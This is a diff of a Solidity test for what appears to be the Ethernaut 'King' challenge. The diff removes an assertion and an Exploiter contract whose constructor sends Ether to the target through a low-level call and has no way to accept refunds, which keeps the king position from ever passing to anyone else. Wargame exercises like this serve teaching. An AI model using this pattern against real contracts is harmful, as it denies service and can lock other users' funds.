@@ -38,15 +38,6 @@ contract TestKing is BaseTest {
 
         vm.startPrank(player, player);
 
-        assertEq(level._king(), address(exploiter));
-
         vm.stopPrank();
-    }
-}
-
-contract Exploiter {
-    constructor(address payable to) public payable {
-        (bool success, ) = address(to).call{value: msg.value}("");
-        require(success, "we are not the new king");
     }
 }
